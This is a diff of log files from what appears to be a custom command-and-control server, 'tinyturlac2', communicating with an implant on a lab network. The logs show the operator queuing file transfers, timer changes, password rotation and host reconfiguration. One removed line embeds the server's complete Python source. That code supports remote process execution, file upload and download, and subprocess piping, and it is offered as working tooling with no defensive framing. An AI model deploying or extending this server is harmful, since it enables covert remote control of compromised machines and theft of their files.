+Command added: Upload file ['C:\\code\\tinyturlac2\\c22.py', 'C:\\Users\\USER\\Desktop\\c22.py']
+192.168.56.1 - - [18/Jan/2025 20:11:31] "GET / HTTP/1.1" 200 -
+GET -> Title: 59
+GET -> Body raw: b'\x04C\x00:\x00\\\x00U\x00s\x00e\x00r\x00s\x00\\\x00U\x00S\x00E\x00R\x00\\\x00D\x00e\x00s\x00k\x00t\x00o\x00p\x00\\\x00c\x002\x002\x00.\x00p\x00y\x00\x00\x00'
+GET -> Body: {'Command': 'Upload file', 'Client Path': 'C:\\Users\\USER\\Desktop\\c22.py', 'Binary Data Length': 0, 'Binary Data Preview': b''}
 POST -> 0x02 error from 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. Re-send the last command.
-Re-queued last command: [3, 'C:\\code\\tinyturlac2\\c2.py', 'C:\\Users\\USER\\Desktop\\c22.py']
-192.168.56.1 - - [18/Jan/2025 19:14:12] "POST / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:14:12] "GET / HTTP/1.1" 200 -
-GET -> Title: 17
-GET -> Body raw: b'\x00p\x00a\x00s\x00s\x00n\x00e\x00w\x00\x00\x00'
-GET -> Body: {'Command': 'Authentication', 'Decoded String': 'passnew'}
+Re-queued last command: [4, 'C:\\code\\tinyturlac2\\c22.py', 'C:\\Users\\USER\\Desktop\\c22.py']
+192.168.56.1 - - [18/Jan/2025 20:11:31] "POST / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:32] "GET / HTTP/1.1" 200 -
+GET -> Title: 23
+GET -> Body raw: b'\x00p\x00a\x00s\x00s\x00n\x00e\x00w\x00w\x00w\x00w\x00\x00\x00'
+GET -> Body: {'Command': 'Authentication', 'Decoded String': 'passnewwww'}
 POST -> 76c19992-0811-4d99-9b6b-41ce0e9e6cc6 is now authenticated.
-192.168.56.1 - - [18/Jan/2025 19:14:13] "POST / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:14:13] "GET / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:32] "POST / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:33] "GET / HTTP/1.1" 200 -
 GET -> Title: 59
 GET -> Body raw: b'\x04C\x00:\x00\\\x00U\x00s\x00e\x00r\x00s\x00\\\x00U\x00S\x00E\x00R\x00\\\x00D\x00e\x00s\x00k\x00t\x00o\x00p\x00\\\x00c\x002\x002\x00.\x00p\x00y\x00\x00\x00'
 GET -> Body: {'Command': 'Upload file', 'Client Path': 'C:\\Users\\USER\\Desktop\\c22.py', 'Binary Data Length': 0, 'Binary Data Preview': b''}
 POST -> Received file chunk from 76c19992-0811-4d99-9b6b-41ce0e9e6cc6 into C:\code\tinyturlac2\c22.py
-192.168.56.1 - - [18/Jan/2025 19:14:13] "POST / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:14:14] "GET / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:33] "POST / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:33] "GET / HTTP/1.1" 200 -
+Command added: Set TimeLong ['5000']
+192.168.56.1 - - [18/Jan/2025 20:11:38] "GET / HTTP/1.1" 200 -
+GET -> Title: 11
+GET -> Body raw: b'\x085\x000\x000\x000\x00\x00\x00'
+GET -> Body: {'Command': 'Set TimeLong', 'Decoded String': '5000'}
+Command added: Set TimeShort ['500']
+POST -> 0x02 error from 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. Re-send the last command.
+Re-queued last command: [8, '5000']
+192.168.56.1 - - [18/Jan/2025 20:11:38] "POST / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:39] "GET / HTTP/1.1" 200 -
+GET -> Title: 23
+GET -> Body raw: b'\x00p\x00a\x00s\x00s\x00n\x00e\x00w\x00w\x00w\x00w\x00\x00\x00'
+GET -> Body: {'Command': 'Authentication', 'Decoded String': 'passnewwww'}
+POST -> 76c19992-0811-4d99-9b6b-41ce0e9e6cc6 is now authenticated.
+192.168.56.1 - - [18/Jan/2025 20:11:39] "POST / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:39] "GET / HTTP/1.1" 200 -
 GET -> Title: 9
-GET -> Body raw: b'\t2\x000\x000\x00\x00\x00'
-GET -> Body: {'Command': 'Set TimeShort', 'Decoded String': '200'}
+GET -> Body raw: b'\t5\x000\x000\x00\x00\x00'
+GET -> Body: {'Command': 'Set TimeShort', 'Decoded String': '500'}
 POST -> Set TimeShort from 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. raw_data=b'\t\x00'
-192.168.56.1 - - [18/Jan/2025 19:14:14] "POST / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:39] "POST / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:40] "GET / HTTP/1.1" 200 -
+GET -> Title: 11
+GET -> Body raw: b'\x085\x000\x000\x000\x00\x00\x00'
+GET -> Body: {'Command': 'Set TimeLong', 'Decoded String': '5000'}
+POST -> Set TimeLong from 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. raw_data=b'\x08\x00'
+192.168.56.1 - - [18/Jan/2025 20:11:40] "POST / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:40] "GET / HTTP/1.1" 200 -
+Command added: Set new Security password ['passnew']
+Command added: Set Host(s) ['192.168.56.1', '9500']
 Set new Security password queued for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6: passnew
-192.168.56.1 - - [18/Jan/2025 19:14:14] "GET / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:45] "GET / HTTP/1.1" 200 -
+GET -> Title: 17
+GET -> Body raw: b'\np\x00a\x00s\x00s\x00n\x00e\x00w\x00\x00\x00'
+GET -> Body: {'Command': 'Set new Security password', 'Decoded String': 'passnew'}
+POST -> 0x02 error from 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. Re-send the last command.
+Re-queued last command: [10, 'passnew']
+192.168.56.1 - - [18/Jan/2025 20:11:45] "POST / HTTP/1.1" 200 -
+Command added: Set Host(s) ['192.168.56.1', '9500']
+192.168.56.1 - - [18/Jan/2025 20:11:46] "GET / HTTP/1.1" 200 -
+GET -> Title: 23
+GET -> Body raw: b'\x00p\x00a\x00s\x00s\x00n\x00e\x00w\x00w\x00w\x00w\x00\x00\x00'
+GET -> Body: {'Command': 'Authentication', 'Decoded String': 'passnewwww'}
+POST -> 76c19992-0811-4d99-9b6b-41ce0e9e6cc6 is now authenticated.
+192.168.56.1 - - [18/Jan/2025 20:11:46] "POST / HTTP/1.1" 200 -
+Command added: Set Host(s) ['192.168.56.1', '9500']
+Set Host(s) queued for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6: 192.168.56.1 9500
+192.168.56.1 - - [18/Jan/2025 20:11:46] "GET / HTTP/1.1" 200 -
+GET -> Title: 37
+GET -> Body raw: b'\x0b1\x009\x002\x00.\x001\x006\x008\x00.\x005\x006\x00.\x001\x00 \x009\x005\x000\x000\x00\x00\x00'
+GET -> Body: {'Command': 'Set Host(s)', 'Decoded String': '192.168.56.1 9500'}
+POST -> Host config changed for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. Now '192.168.56.1 9500' stored.
+192.168.56.1 - - [18/Jan/2025 20:11:46] "POST / HTTP/1.1" 200 -
+Set new Security password queued for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6: passnew
+192.168.56.1 - - [18/Jan/2025 20:11:47] "GET / HTTP/1.1" 200 -
 GET -> Title: 17
 GET -> Body raw: b'\np\x00a\x00s\x00s\x00n\x00e\x00w\x00\x00\x00'
 GET -> Body: {'Command': 'Set new Security password', 'Decoded String': 'passnew'}
 POST -> Password changed for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. Now 'passnew' stored.
-192.168.56.1 - - [18/Jan/2025 19:14:14] "POST / HTTP/1.1" 200 -
-Queued Download: C:\code\tinyturlac2\c2.py -> C:\Users\USER\Desktop\c22.py
-192.168.56.1 - - [18/Jan/2025 19:14:14] "GET / HTTP/1.1" 200 -
-GET -> Title: 10968
-GET -> Body raw: b'\x03C\x00:\x00\\\x00U\x00s\x00e\x00r\x00s\x00\\\x00U\x00S\x00E\x00R\x00\\\x00D\x00e\x00s\x00k\x00t\x00o\x00p\x00\\\x00c\x002\x002\x00.\x00p\x00y\x00\x00\x00import os\r\nimport ssl\r\nimport threading\r\nimport queue\r\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\r\n\r\nSECURITY_PASSWORD_FILE = "security_password.txt"\r\nHOST_CONFIG_FILE = "host_config.txt"\r\n\r\ndef load_security_password():\r\n    if os.path.exists(SECURITY_PASSWORD_FILE):\r\n        with open(SECURITY_PASSWORD_FILE, "r", encoding="utf-8") as f:\r\n            return f.read().strip()\r\n    pw = "test"\r\n    with open(SECURITY_PASSWORD_FILE, "w", encoding="utf-8") as f:\r\n        f.write(pw)\r\n    return pw\r\n\r\ndef store_security_password(new_password):\r\n    with open(SECURITY_PASSWORD_FILE, "w", encoding="utf-8") as f:\r\n        f.write(new_password)\r\n\r\ndef load_host_config():\r\n    if os.path.exists(HOST_CONFIG_FILE):\r\n        with open(HOST_CONFIG_FILE, "r", encoding="utf-8") as f:\r\n            return f.read().strip()\r\n    return ""\r\n\r\ndef store_host_config(ip_port_str):\r\n    with open(HOST_CONFIG_FILE, "w", encoding="utf-8") as f:\r\n        f.write(ip_port_str)\r\n\r\nSECURITY_PASSWORD = load_security_password()\r\ncommand_queue = queue.Queue()\r\nconnected_guids = {}\r\nfileFrom = {}\r\npending_passwords = {}\r\npending_hosts = {}\r\nlast_command = {}\r\n\r\nCOMMANDS = {\r\n    0x00: "Authentication", 0x01: "Execute process", 0x02: "Execute w/ output", 0x03: "Download file",\r\n    0x04: "Upload file",    0x05: "Create Subprocess",0x06: "Close Subprocess",0x07: "Subprocess pipe in/out",\r\n    0x08: "Set TimeLong",   0x09: "Set TimeShort",    0x0A: "Set new Security password", 0x0B: "Set Host(s)"\r\n}\r\n\r\ndef log_to_file(message, filename="c2_server.log"):\r\n    with open(filename, "a", encoding="utf-8") as lf:\r\n        lf.write(f"{message}\\n")\r\n\r\ndef decode_file_command(payload: bytes):\r\n    path_bytes = bytearray()\r\n    i = 0\r\n    while i + 1 < len(payload):\r\n        if payload[i] == 0x00 and payload[i+1] == 0x00:\r\n            i += 2\r\n            break\r\n        path_bytes.extend(payload[i:i+2])\r\n        i += 2\r\n    return path_bytes.decode("utf-16-le", errors="ignore"), payload[i:]\r\n\r\ndef decode_body(response_body):\r\n    try:\r\n        cmd = response_body[0]\r\n        cmd_desc = COMMANDS.get(cmd, "Unknown Command")\r\n        payload = response_body[1:]\r\n        if cmd in [0x03, 0x04]:\r\n            client_path, file_data = decode_file_command(payload)\r\n            return {\r\n                "Command": cmd_desc,\r\n                "Client Path": client_path,\r\n                "Binary Data Length": len(file_data),\r\n                "Binary Data Preview": file_data[:20],\r\n            }\r\n        return {"Command": cmd_desc, "Decoded String": payload.decode("utf-16-le", errors="ignore").rstrip("\\x00")}\r\n    except Exception as e:\r\n        return {"Error": str(e)}\r\n\r\nclass C2Handler(BaseHTTPRequestHandler):\r\n    def log_message(self, format, *args):\r\n        log_to_file(f"{self.address_string()} - - [{self.log_date_time_string()}] {format % args}")\r\n\r\n    def send_ok(self):\r\n        self.send_response(200)\r\n        self.end_headers()\r\n\r\n    def send_get_response(self, body):\r\n        cmd_len = len(body)\r\n        self.send_response(200)\r\n        self.send_header("Title", cmd_len)\r\n        self.end_headers()\r\n        log_to_file(f"GET -> Title: {cmd_len}")\r\n        log_to_file(f"GET -> Body raw: {body}")\r\n        log_to_file(f"GET -> Body: {decode_body(body)}")\r\n        self.wfile.write(body)\r\n\r\n    def do_GET(self):\r\n        guid = self.headers.get("Title") or "UnknownGUID"\r\n        if guid not in connected_guids:\r\n            connected_guids[guid] = False\r\n        if command_queue.empty():\r\n            self.send_ok()\r\n            return\r\n        if not connected_guids[guid]:\r\n            auth_cmd = 0x00\r\n            payload = SECURITY_PASSWORD.encode("utf-16-le") + b"\\x00\\x00"\r\n            self.send_get_response(bytes([auth_cmd]) + payload)\r\n            return\r\n        item = command_queue.get()\r\n        command_byte = item[0]\r\n        args = item[1:]\r\n        last_command[guid] = item\r\n        response_body = b""\r\n\r\n        if command_byte == 0x03:  # Download file\r\n            file_path, client_path = args\r\n            try:\r\n                with open(file_path, "rb") as f:\r\n                    file_data = f.read()\r\n                path_utf16 = client_path.encode("utf-16-le") + b"\\x00\\x00"\r\n                response_body = bytes([command_byte]) + path_utf16 + file_data\r\n                log_to_file(f"Queued Download: {file_path} -> {client_path}")\r\n            except Exception as e:\r\n                log_to_file(f"Download file error: {e}")\r\n        elif command_byte == 0x04:  # Upload file\r\n            file_path, client_path = args\r\n            fileFrom[guid] = file_path\r\n            path_utf16 = client_path.encode("utf-16-le") + b"\\x00\\x00"\r\n            response_body = bytes([command_byte]) + path_utf16\r\n        elif command_byte == 0x0A:  # Set new Security password\r\n            new_password = " ".join(args)\r\n            pending_passwords[guid] = new_password\r\n            payload_utf16 = new_password.encode("utf-16-le") + b"\\x00\\x00"\r\n            response_body = bytes([command_byte]) + payload_utf16\r\n            log_to_file(f"Set new Security password queued for {guid}: {new_password}")\r\n        elif command_byte == 0x0B:  # Set host config\r\n            ip, port = args\r\n            pending_hosts[guid] = f"{ip} {port}"\r\n            payload_utf16 = (f"{ip} {port}").encode("utf-16-le") + b"\\x00\\x00"\r\n            response_body = bytes([command_byte]) + payload_utf16\r\n            log_to_file(f"Set Host(s) queued for {guid}: {ip} {port}")\r\n        else:  # Other commands\r\n            combined_args = " ".join(args)\r\n            payload_utf16 = combined_args.encode("utf-16-le") + b"\\x00\\x00"\r\n            response_body = bytes([command_byte]) + payload_utf16\r\n\r\n        self.send_get_response(response_body)\r\n\r\n    def do_POST(self):\r\n        guid = self.headers.get("Title", "NoGuid")\r\n        if guid not in connected_guids:\r\n            connected_guids[guid] = False\r\n        content_length = int(self.headers.get(\'Content-Length\', 0))\r\n        raw_data = self.rfile.read(content_length)\r\n        if not raw_data:\r\n            self.send_ok()\r\n            return\r\n        cmd = raw_data[0]\r\n        error_code = raw_data[1] if len(raw_data) > 1 else None\r\n\r\n        if error_code == 0x02:\r\n            log_to_file(f"POST -> 0x02 error from {guid}. Re-send the last command.")\r\n            if guid in last_command:\r\n                command_queue.put(last_command[guid])\r\n                connected_guids[guid] = False\r\n                log_to_file(f"Re-queued last command: {last_command[guid]}")\r\n            else:\r\n                log_to_file(f"No last command stored for {guid}.")\r\n        elif cmd == 0x00:\r\n            if len(raw_data) > 1 and raw_data[1] == 0x00:\r\n                connected_guids[guid] = True\r\n                log_to_file(f"POST -> {guid} is now authenticated.")\r\n            else:\r\n                connected_guids[guid] = False\r\n                log_to_file(f"POST -> Auth error from {guid}. raw_data={raw_data}")\r\n        elif cmd == 0x02:\r\n            print(f"POST -> {COMMANDS.get(cmd, \'Unknown\')} from {guid}. raw_data={raw_data}")\r\n            log_to_file(f"POST -> {COMMANDS.get(cmd, \'Unknown\')} from {guid}. raw_data={raw_data}")\r\n        elif cmd == 0x04:\r\n            if fileFrom.get(guid) != "DONE":\r\n                filename = fileFrom.get(guid)\r\n                if filename:\r\n                    with open(filename, "wb") as f:\r\n                        f.write(raw_data[2:])\r\n                    log_to_file(f"POST -> Received file chunk from {guid} into {filename}")\r\n                    fileFrom[guid] = "DONE"\r\n                else:\r\n                    log_to_file(f"POST -> No filename for {guid}. raw={raw_data}")\r\n            else:\r\n                log_to_file(f"POST -> Already saved file from {guid}: {raw_data}")\r\n        elif cmd == 0x0A:\r\n            if len(raw_data) > 1 and raw_data[1] == 0x00:\r\n                new_pass = pending_passwords.get(guid)\r\n                if new_pass:\r\n                    store_security_password(new_pass)\r\n                    log_to_file(f"POST -> Password changed for {guid}. Now \'{new_pass}\' stored.")\r\n                    del pending_passwords[guid]\r\n                else:\r\n                    log_to_file(f"POST -> 0x0A ack from {guid}, but no pending password found.")\r\n            else:\r\n                log_to_file(f"POST -> 0x0A from {guid}, second byte != 0x00. Raw={raw_data}")\r\n        elif cmd == 0x0B:\r\n            if len(raw_data) > 1 and raw_data[1] == 0x00:\r\n                new_host = pending_hosts.get(guid)\r\n                if new_host:\r\n                    store_host_config(new_host)\r\n                    log_to_file(f"POST -> Host config changed for {guid}. Now \'{new_host}\' stored.")\r\n                    del pending_hosts[guid]\r\n                else:\r\n                    log_to_file(f"POST -> 0x0B ack from {guid}, but no pending host found.")\r\n            else:\r\n                log_to_file(f"POST -> 0x0B from {guid}, second byte != 0x00. Raw={raw_data}")\r\n        else:\r\n            log_to_file(f"POST -> {COMMANDS.get(cmd, \'Unknown\')} from {guid}. raw_data={raw_data}")\r\n\r\n        self.send_ok()\r\n\r\ndef read_commands():\r\n    while True:\r\n        user_input = input("Enter command (e.g. \'b 192.168.56.1 9500\'): ").strip()\r\n        if user_input:\r\n            parts = user_input.split()\r\n            try:\r\n                if parts[0].lower() == \'b\':\r\n                    cmd = 0x0B\r\n                    args = parts[1:]\r\n                else:\r\n                    cmd = int(parts[0], 16)\r\n                    args = parts[1:]\r\n            except ValueError:\r\n                print("Invalid format. e.g. \'b 192.168.56.1 9500\' or \'9 2000\'")\r\n                continue\r\n            command_queue.put([cmd] + args)\r\n            log_to_file(f"Command added: {COMMANDS.get(cmd, \'Unknown\')} {args}")\r\n\r\ndef start_c2_server(server_started_event):\r\n    host_config = load_host_config()\r\n    if host_config:\r\n        ip_str, port_str = host_config.split()\r\n        server_ip, server_port = ip_str, int(port_str)\r\n    else:\r\n        server_ip, server_port = \'0.0.0.0\', 9500\r\n    httpd = HTTPServer((server_ip, server_port), C2Handler)\r\n    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\r\n    context.load_cert_chain(certfile="server.crt", keyfile="server.key")\r\n    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)\r\n    print(f"Server started {server_ip}:{server_port}")\r\n    server_started_event.set()  # Notify that the server has started\r\n    httpd.serve_forever()\r\n\r\nif __name__ == "__main__":\r\n    server_started_event = threading.Event()\r\n    threading.Thread(target=start_c2_server, args=(server_started_event,), daemon=True).start()\r\n\r\n    # Wait for the server to start before reading commands\r\n    server_started_event.wait()\r\n    print("C2 server is running. Ready to accept commands.")\r\n    read_commands()\r\n\r\n'
-GET -> Body: {'Command': 'Download file', 'Client Path': 'C:\\Users\\USER\\Desktop\\c22.py', 'Binary Data Length': 10909, 'Binary Data Preview': b'import os\r\nimport ss'}
-POST -> Download file from 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. raw_data=b'\x03\x00'
-192.168.56.1 - - [18/Jan/2025 19:14:14] "POST / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:14:14] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:14:19] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:14:24] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:14:29] "GET / HTTP/1.1" 200 -
-Command added: Set TimeShort ['500']
-192.168.56.1 - - [18/Jan/2025 19:14:34] "GET / HTTP/1.1" 200 -
-GET -> Title: 9
-GET -> Body raw: b'\t5\x000\x000\x00\x00\x00'
-GET -> Body: {'Command': 'Set TimeShort', 'Decoded String': '500'}
+192.168.56.1 - - [18/Jan/2025 20:11:47] "POST / HTTP/1.1" 200 -
+Set Host(s) queued for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6: 192.168.56.1 9500
+192.168.56.1 - - [18/Jan/2025 20:11:47] "GET / HTTP/1.1" 200 -
+GET -> Title: 37
+GET -> Body raw: b'\x0b1\x009\x002\x00.\x001\x006\x008\x00.\x005\x006\x00.\x001\x00 \x009\x005\x000\x000\x00\x00\x00'
+GET -> Body: {'Command': 'Set Host(s)', 'Decoded String': '192.168.56.1 9500'}
+POST -> Host config changed for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. Now '192.168.56.1 9500' stored.
+192.168.56.1 - - [18/Jan/2025 20:11:47] "POST / HTTP/1.1" 200 -
+Set Host(s) queued for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6: 192.168.56.1 9500
+192.168.56.1 - - [18/Jan/2025 20:11:48] "GET / HTTP/1.1" 200 -
+GET -> Title: 37
+GET -> Body raw: b'\x0b1\x009\x002\x00.\x001\x006\x008\x00.\x005\x006\x00.\x001\x00 \x009\x005\x000\x000\x00\x00\x00'
+GET -> Body: {'Command': 'Set Host(s)', 'Decoded String': '192.168.56.1 9500'}
+POST -> Host config changed for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. Now '192.168.56.1 9500' stored.
+192.168.56.1 - - [18/Jan/2025 20:11:48] "POST / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:48] "GET / HTTP/1.1" 200 -
+Command added: Set new Security password ['passnew']
+Command added: Set new Security password ['passnewwww']
+Set new Security password queued for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6: passnew
+192.168.56.1 - - [18/Jan/2025 20:11:53] "GET / HTTP/1.1" 200 -
+GET -> Title: 17
+GET -> Body raw: b'\np\x00a\x00s\x00s\x00n\x00e\x00w\x00\x00\x00'
+GET -> Body: {'Command': 'Set new Security password', 'Decoded String': 'passnew'}
 POST -> 0x02 error from 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. Re-send the last command.
-Re-queued last command: [9, '500']
-192.168.56.1 - - [18/Jan/2025 19:14:34] "POST / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:14:34] "GET / HTTP/1.1" 200 -
+Re-queued last command: [10, 'passnew']
+192.168.56.1 - - [18/Jan/2025 20:11:53] "POST / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:54] "GET / HTTP/1.1" 200 -
 GET -> Title: 17
 GET -> Body raw: b'\x00p\x00a\x00s\x00s\x00n\x00e\x00w\x00\x00\x00'
 GET -> Body: {'Command': 'Authentication', 'Decoded String': 'passnew'}
 POST -> 76c19992-0811-4d99-9b6b-41ce0e9e6cc6 is now authenticated.
-192.168.56.1 - - [18/Jan/2025 19:14:34] "POST / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:14:35] "GET / HTTP/1.1" 200 -
-GET -> Title: 9
-GET -> Body raw: b'\t5\x000\x000\x00\x00\x00'
-GET -> Body: {'Command': 'Set TimeShort', 'Decoded String': '500'}
-POST -> Set TimeShort from 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. raw_data=b'\t\x00'
-192.168.56.1 - - [18/Jan/2025 19:14:35] "POST / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:14:35] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:14:40] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:14:45] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:14:50] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:14:55] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:15:00] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:15:05] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:15:10] "GET / HTTP/1.1" 200 -
-192.168.56.1 - - [18/Jan/2025 19:15:15] "GET / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:54] "POST / HTTP/1.1" 200 -
+Command added: Set Host(s) ['192.168.56.1', '9500']
+Set new Security password queued for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6: passnewwww
+192.168.56.1 - - [18/Jan/2025 20:11:54] "GET / HTTP/1.1" 200 -
+GET -> Title: 23
+GET -> Body raw: b'\np\x00a\x00s\x00s\x00n\x00e\x00w\x00w\x00w\x00w\x00\x00\x00'
+GET -> Body: {'Command': 'Set new Security password', 'Decoded String': 'passnewwww'}
+POST -> Password changed for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. Now 'passnewwww' stored.
+192.168.56.1 - - [18/Jan/2025 20:11:54] "POST / HTTP/1.1" 200 -
+Set new Security password queued for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6: passnew
+192.168.56.1 - - [18/Jan/2025 20:11:55] "GET / HTTP/1.1" 200 -
+GET -> Title: 17
+GET -> Body raw: b'\np\x00a\x00s\x00s\x00n\x00e\x00w\x00\x00\x00'
+GET -> Body: {'Command': 'Set new Security password', 'Decoded String': 'passnew'}
+POST -> Password changed for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. Now 'passnew' stored.
+192.168.56.1 - - [18/Jan/2025 20:11:55] "POST / HTTP/1.1" 200 -
+Set Host(s) queued for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6: 192.168.56.1 9500
+192.168.56.1 - - [18/Jan/2025 20:11:55] "GET / HTTP/1.1" 200 -
+GET -> Title: 37
+GET -> Body raw: b'\x0b1\x009\x002\x00.\x001\x006\x008\x00.\x005\x006\x00.\x001\x00 \x009\x005\x000\x000\x00\x00\x00'
+GET -> Body: {'Command': 'Set Host(s)', 'Decoded String': '192.168.56.1 9500'}
+POST -> Host config changed for 76c19992-0811-4d99-9b6b-41ce0e9e6cc6. Now '192.168.56.1 9500' stored.
+192.168.56.1 - - [18/Jan/2025 20:11:55] "POST / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:11:56] "GET / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:12:01] "GET / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:12:06] "GET / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:12:11] "GET / HTTP/1.1" 200 -
+192.168.56.1 - - [18/Jan/2025 20:12:16] "GET / HTTP/1.1" 200 -
